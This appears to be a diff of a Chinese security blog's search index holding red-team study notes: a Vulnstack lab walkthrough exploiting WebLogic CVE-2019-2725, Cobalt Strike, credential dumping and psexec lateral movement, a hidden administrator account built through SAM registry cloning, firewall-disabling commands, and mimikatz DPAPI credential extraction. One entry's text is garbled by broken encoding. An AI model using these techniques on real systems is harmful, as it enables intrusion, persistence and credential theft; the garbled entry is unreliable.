+<p>为了清除所有RDP连接和保存的用户名历史记录，必须清除服务器注册表项的内容。删除整个Servers然后重新创建。</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142952206.png" alt="image-20210407142952206"></p>
+<ul>
+<li>最后把默认的RDP连接文件（包含最新的RDP会话信息）删除- <code>Default.rdp</code></li>
+</ul>
+<blockquote>
+<p>默认在Document目录中隐藏起来</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143207075.png" alt="image-20210407143207075"></p>
+<blockquote>
+<p>删除</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143445878.png" alt="image-20210407143445878"></p>
+]]></content>
+      <categories>
+        <category>内网学习笔记</category>
+      </categories>
+      <tags>
+        <tag>红队</tag>
+        <tag>学习笔记</tag>
+        <tag>内网渗透</tag>
+        <tag>mstsc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ATT&amp;CK红队实战(二)</title>
+    <url>/2021/03/30/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)/</url>
+    <content><![CDATA[<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶场地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<h3 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h3><blockquote>
+<p>内网网段 192.168.100.0/24</p>
+<p>外网网段 10.7.0.0/16</p>
+</blockquote>
+<ul>
+<li>WEB（双网卡）<ul>
+<li>IP: 192.168.100.129    (仅主机)</li>
+<li>IP: 10.7.7.14 (桥接)</li>
+</ul>
+</li>
+<li>PC：（双网卡）<ul>
+<li>IP：192.168.100.130（仅主机）</li>
+<li>IP：10.7.7.15(桥接)</li>
+</ul>
+</li>
+<li>DC：<ul>
+<li>IP：192.168.100.134（仅主机）</li>
+</ul>
+</li>
+<li>Kali：<ul>
+<li>IP：10.7.7.7（桥接）</li>
+</ul>
+</li>
+</ul>
+<h3 id="网络测试"><a href="#网络测试" class="headerlink" title="网络测试"></a>网络测试</h3><p>最终实现所有网络互通，<code>WEB</code>和<code>PC</code>都能上网且ping得通<code>DC</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329144425454.png" alt="image-20210329144425454"></p>
+<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
+<li>主机发现</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 10.7.0.0&#x2F;16</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329145021760.png" alt="image-20210329145021760"></p>
+<ul>
+<li>漏洞扫描</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -n -sV 10.7.7.14</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329145518651.png" alt="image-20210329145518651"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
+<p>发现靶机开放7001端口的Weblogic 服务，使用WeblogicScan.py 扫描</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python WeblogicScan.py <span class="number">10.7</span><span class="number">.7</span><span class="number">.14</span> <span class="number">7001</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329195505233.png" alt="image-20210329195505233"></p>
+<blockquote>
+<p>发现<code>CVE-2019-2725</code>漏洞存在,攻击利用</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;misc&#x2F;weblogic_deserialize_asyncresponseservice</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>把选项都设置好</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329195923008.png" alt="image-20210329195923008"></p>
+<blockquote>
+<p>攻击利用</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329200050880.png" alt="image-20210329200050880"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329200116102.png" alt="image-20210329200116102"></p>
+<blockquote>
+<p>接下来上线CS然后<code>Bypass UAC</code></p>
+</blockquote>
+<ul>
+<li>CS生成一段攻击载荷</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201125834.png" alt="image-20210329201125834"></p>
+<ul>
+<li>这里的靶机是64位的所以要勾上<code>Use x64 payload</code></li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201232926.png" alt="image-20210329201232926"></p>
+<ul>
+<li>靶机上执行</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201455408.png" alt="image-20210329201455408"></p>
+<ul>
+<li>CS主机上线</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201543198.png" alt="image-20210329201543198"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">shell <span class="built_in">ipconfig</span> /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201833526.png" alt="image-20210329201833526"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201857899.png" alt="image-20210329201857899"></p>
+<ul>
+<li>存活主机发现</li>
+</ul>
+<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201957129.png" alt="image-20210329201957129"></p>
+<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">portscan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329202243388.png" alt="image-20210329202243388"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329202742789.png" alt="image-20210329202742789"></p>
+<ul>
+<li>查看扫描到的主机</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329203023097.png" alt="image-20210329203023097"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><code>bypassuac</code>:将本地中管理员权限提升至高级管理员权限</p>
+<p><code>spawns</code>：使用其它用户的凭证来以其它用户身份派生一个会话，这个命令派生一个临时进程并将payload stage 注入进那个进程</p>
+<ul>
+<li>先生成一个<code>SMB</code>的监听</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329203626702.png" alt="image-20210329203626702"></p>
+<ul>
+<li>提取密码</li>
+</ul>
+<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330083409823.png" alt="image-20210330083409823"></p>
+<ul>
+<li>这里来查看破解的密码</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330083506753.png" alt="image-20210330083506753"></p>
+<ul>
+<li><code>Spawn As</code> 派生一个<code>SMB</code></li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330083809217.png" alt="image-20210330083809217"></p>
+<ul>
+<li>进入<code>Target</code>使用<code>psexec</code>来提升权限</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084102060.png" alt="image-20210330084102060"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084241250.png" alt="image-20210330084241250"></p>
+<ul>
+<li>已提升至<code>SYSTEM</code>权限</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084414521.png" alt="image-20210330084414521"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><ul>
+<li>通过之前<code>net view</code>/<code>Port scan</code> 扫描到了内网还有两台主机</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084903046.png" alt="image-20210330084903046"></p>
+<h3 id="横向提权"><a href="#横向提权" class="headerlink" title="横向提权"></a>横向提权</h3><blockquote>
+<p>Administrator是域管理员，使用<code>pxexec</code>凭证来登陆其它两台主机</p>
+</blockquote>
+<ul>
+<li>登陆PC</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095224253.png" alt="image-20210330095224253"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095304886.png" alt="image-20210330095304886"></p>
+<p>主机上线</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095552574.png" alt="image-20210330095552574"></p>
+<ul>
+<li>登陆DC</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095827436.png" alt="image-20210330095827436"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095910259.png" alt="image-20210330095910259"></p>
+<p>主机上线</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330100014169.png" alt="image-20210330100014169"></p>
+<p>至此三台主机全部拿下，且都是<code>SYSTEM</code>权限</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330100450381.png" alt="image-20210330100450381"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>先是通过攻击WEB这台机子然后进入内网横向移动再提权，最终所有主机都成功上线。</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330100401754.png" alt="image-20210330100401754"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>红队</tag>
+        <tag>域</tag>
+        <tag>攻防</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【内网渗透学习笔记】03、Windows建立隐藏用户</title>
+    <url>/2021/04/03/intranet03/</url>
+    <content><![CDATA[<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><ol>
+<li>新建一个特殊用户</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ P@ssw0rd /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators hacker$ /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403141500963.png" alt="image-20210403141500963"></p>
+<blockquote>
+<p>用户名以<code>$</code>结尾在net user下无法获取，但是在控制面板还能看到</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403141948213.png" alt="image-20210403141948213"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142029285.png" alt="image-20210403142029285"></p>
+<ol start="2">
+<li>找到注册表路径下<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>的<code>hacker$</code></li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142229174.png" alt="image-20210403142229174"></p>
+<ol start="3">
+<li>此时将管理员<code>Administrator</code>类型对应的F值复制到<code>hacker$</code>类型对应的F值</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142509715.png" alt="image-20210403142509715"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142607007.png" alt="image-20210403142607007"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142807987.png" alt="image-20210403142807987"></p>
+<ol start="4">
+<li>将hacker$对应的两个值导出来</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143059455.png" alt="image-20210403143059455"></p>
+<ol start="5">
+<li>命令行将用户删除</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143345249.png" alt="image-20210403143345249"></p>
+<ol start="6">
+<li>然后再将导出来的reg合并</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143444798.png" alt="image-20210403143444798"></p>
+<ol start="7">
+<li>合并完后net user无法列出此用户，控制面板中的本地用户和组也不存在该用户</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145457335.png" alt="image-20210403145457335"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145515913.png" alt="image-20210403145515913"></p>
+<ol start="8">
+<li>远程登陆成功</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145606553.png" alt="image-20210403145606553"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>针对隐藏用户，可以查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>,有时候看不到是因为没有权限，需要分配权限。隐藏用户的登陆记录可以通过查看日志获取。</p>
+]]></content>
+      <categories>
+        <category>内网学习笔记</category>
+      </categories>
+      <tags>
+        <tag>红队</tag>
+        <tag>学习笔记</tag>
+        <tag>内网渗透</tag>
+        <tag>隐藏用户</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【内网渗透学习笔记】02、内网渗透中的certutil</title>
     <url>/2021/04/01/intranet02/</url>
     <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以及执行证书相关的各种功能。</p>
@@ -788,62 +931,198 @@
       </tags>
   </entry>
   <entry>
-    <title>【内网渗透学习笔记】03、Windows建立隐藏用户</title>
-    <url>/2021/04/03/intranet03/</url>
-    <content><![CDATA[<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><ol>
-<li>新建一个特殊用户</li>
-</ol>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ P@ssw0rd /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators hacker$ /add</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403141500963.png" alt="image-20210403141500963"></p>
-<blockquote>
-<p>用户名以<code>$</code>结尾在net user下无法获取，但是在控制面板还能看到</p>
+    <title>��������͸ѧϰ�ʼǡ�06����Ϣ�ռ�</title>
+    <url>/2021/04/12/intranet06/</url>
+    <content><![CDATA[<h2 id="j��"><a href="#j��" class="headerlink" title="ǰ��"></a>ǰ��</h2><p><em><u><strong>��͸�ı�������Ϣ�ռ�</strong></u></em></p>
+<h2 id="������Ϣ�ռ�"><a href="#������Ϣ�ռ�" class="headerlink" title="������Ϣ�ռ�"></a>������Ϣ�ռ�</h2><blockquote>
+<p>��������ϵͳ���û�Ȩ�ޡ�����ip�Ρ�ɱ���������˿ڿ���……</p>
 </blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403141948213.png" alt="image-20210403141948213"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142029285.png" alt="image-20210403142029285"></p>
-<ol start="2">
-<li>找到注册表路径下<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>的<code>hacker$</code></li>
-</ol>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142229174.png" alt="image-20210403142229174"></p>
-<ol start="3">
-<li>此时将管理员<code>Administrator</code>类型对应的F值复制到<code>hacker$</code>类型对应的F值</li>
-</ol>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142509715.png" alt="image-20210403142509715"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142607007.png" alt="image-20210403142607007"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142807987.png" alt="image-20210403142807987"></p>
-<ol start="4">
-<li>将hacker$对应的两个值导出来</li>
-</ol>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143059455.png" alt="image-20210403143059455"></p>
-<ol start="5">
-<li>命令行将用户删除</li>
-</ol>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>����ip��</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143345249.png" alt="image-20210403143345249"></p>
-<ol start="6">
-<li>然后再将导出来的reg合并</li>
-</ol>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143444798.png" alt="image-20210403143444798"></p>
-<ol start="7">
-<li>合并完后net user无法列出此用户，控制面板中的本地用户和组也不存在该用户</li>
-</ol>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145457335.png" alt="image-20210403145457335"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145515913.png" alt="image-20210403145515913"></p>
-<ol start="8">
-<li>远程登陆成功</li>
-</ol>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145606553.png" alt="image-20210403145606553"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>针对隐藏用户，可以查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>,有时候看不到是因为没有权限，需要分配权限。隐藏用户的登陆记录可以通过查看日志获取。</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412150323445.png" alt="image-20210412150323445"></p>
+<ul>
+<li>��ѯ����ϵͳ��������Ϣ</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412150423634.png" alt="image-20210412150423634"></p>
+<ul>
+<li>��ѯ��ϵ�ܹ�</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">%PROCESSOR_ARCHITECTURE%</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412150527487.png" alt="image-20210412150527487"></p>
+<ul>
+<li>��ѯ�Ѱ�װ�������汾��Ϣ</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>��ѯ��������</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412150723699.png" alt="image-20210412150723699"></p>
+<ul>
+<li>��ѯ����</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412150818954.png" alt="image-20210412150818954"></p>
+<blockquote>
+<p>������ɱ����������</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>������</th>
+<th>����</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>360sd.exe</td>
+<td>360ɱ��</td>
+</tr>
+<tr>
+<td>360tray.exe</td>
+<td>360ʵʱ����</td>
+</tr>
+<tr>
+<td>ZhuDongFangYu.exe</td>
+<td>360��������</td>
+</tr>
+<tr>
+<td>KSafeTray.exe</td>
+<td>��ɽ��ʿ</td>
+</tr>
+<tr>
+<td>SafeDogUpdateCenter.exe</td>
+<td>��ȫ��</td>
+</tr>
+<tr>
+<td>McAfee McShield.exe</td>
+<td>McAfee</td>
+</tr>
+<tr>
+<td>egui.exe</td>
+<td>NOD32</td>
+</tr>
+<tr>
+<td>AVP.exe</td>
+<td>����˹��</td>
+</tr>
+<tr>
+<td>avguard.exe</td>
+<td>С��ɡ</td>
+</tr>
+<tr>
+<td>bdagent.exe</td>
+<td>BitDefender</td>
+</tr>
+</tbody></table>
+<ul>
+<li>�鿴�������ĳ�����Ϣ��</li>
+</ul>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">wmic startup <span class="built_in">get</span> <span class="keyword">command</span>,<span class="title">caption</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>�鿴��������ʱ��</li>
+</ul>
+<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> statistics workstation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412151232852.png" alt="image-20210412151232852"></p>
+<ul>
+<li>�鿴�û��б�</li>
+</ul>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">net <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412151529571.png" alt="image-20210412151529571"></p>
+<ul>
+<li>�鿴���ع���Ա��Ϣ</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412151722650.png" alt="image-20210412151722650"></p>
+<ul>
+<li>�鿴�˿ڿ���</li>
+</ul>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat -ano</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412151813985.png" alt="image-20210412151813985"></p>
+<ul>
+<li>�鿴����ǽ����</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> firewall </span>show config</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412151906341.png" alt="image-20210412151906341"></p>
+<ul>
+<li>�رշ���ǽ</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">server2003֮ǰ��netsh firewall <span class="built_in">set</span> opmode disable</span><br><span class="line">server2003֮��netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>����</li>
+</ul>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span>	�鿴��ǰ�����Ļ�����������</span><br><span class="line">ver	�鿴��ǰ������<span class="comment">nt</span>�ں˰汾����������</span><br><span class="line">winver	�鿴��ǰ������<span class="comment">nt</span>�ں˰汾��������</span><br><span class="line">fsutil <span class="comment">fsinfo drives</span>	�г���ǰ�����ϵ������̷�</span><br><span class="line">netshare	�鿴����</span><br><span class="line">dir /a-r-d /<span class="comment">s</span> /b	���ҵ�ǰ�û��ɶ�дĿ¼</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h2><blockquote>
+<p>SPN:�����������ơ�ʹ��Kerberos��Ϊ������ע��SPN����˿���������ɨ��SPN������Ѱ��������ע��ķ���SPNɨ����Թ����˿�ɨ��Ĳ�ȷ����̽�⶯����</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210412152937579.png" alt="image-20210412152937579"></p>
+<h2 id="������Ϣ�ռ�-1"><a href="#������Ϣ�ռ�-1" class="headerlink" title="������Ϣ�ռ�"></a>������Ϣ�ռ�</h2><ul>
+<li>��ѯ��</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> view /domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>��ѯ�������м����</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> view /domain:����</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>��ѯ���������û���</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group/domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>�鿴�������Ա������б�</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>��ȡ��������Ϣ</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> accounts /domain</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>��ȡ��������Ϣ</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>������ػ�����</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nltest /DCLIST:����</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>�鿴���������</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=SRV \_ladp._tcp</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>内网学习笔记</category>
+        <category>����ѧϰ�ʼ�</category>
       </categories>
       <tags>
-        <tag>红队</tag>
-        <tag>学习笔记</tag>
-        <tag>内网渗透</tag>
-        <tag>隐藏用户</tag>
+        <tag>��Ϣ�ռ�</tag>
+        <tag>���</tag>
+        <tag>ѧϰ�ʼ�</tag>
+        <tag>������͸</tag>
       </tags>
   </entry>
   <entry>
@@ -927,90 +1206,6 @@
         <tag>内网渗透</tag>
         <tag>代理</tag>
         <tag>端口转发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【内网渗透学习笔记】05、获取Winodws的远程连接记录</title>
-    <url>/2021/04/07/intranet05/</url>
-    <content><![CDATA[<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><blockquote>
-<p>在使用mstsc连接的时候，管理员勾选了自动保存密码连接的选项</p>
-</blockquote>
-<h2 id="获得远程桌面连接历史记录"><a href="#获得远程桌面连接历史记录" class="headerlink" title="获得远程桌面连接历史记录"></a>获得远程桌面连接历史记录</h2><ul>
-<li>获得当前用户的历史记录</li>
-</ul>
-<blockquote>
-<p>注册表 <code>HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p>
-</blockquote>
-<p>每个注册表的项保存着连接的服务器地址，键值<code>UsernameHine</code>对应登陆用户名</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140054423.png" alt="image-20210407140054423"></p>
-<h2 id="获得远程桌面连接的密码"><a href="#获得远程桌面连接的密码" class="headerlink" title="获得远程桌面连接的密码"></a>获得远程桌面连接的密码</h2><ul>
-<li>查看计算机的连接记录</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list	</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140453363.png" alt="image-20210407140453363"></p>
-<ul>
-<li>查找本地的证书</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140601500.png" alt="image-20210407140601500"></p>
-<ul>
-<li>使用<code>mimikatz</code></li>
-</ul>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD<span class="number">155</span>F<span class="number">4888</span>E<span class="number">9</span>DB<span class="number">9</span>D<span class="number">7</span>FE<span class="number">4</span>C<span class="number">235728</span>F<span class="number">8</span>C</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140830258.png" alt="image-20210407140830258"></p>
-<blockquote>
-<p>把<code>guimasterkey</code>记下来</p>
-</blockquote>
-<ul>
-<li>使用 <code>::dpapi</code></li>
-</ul>
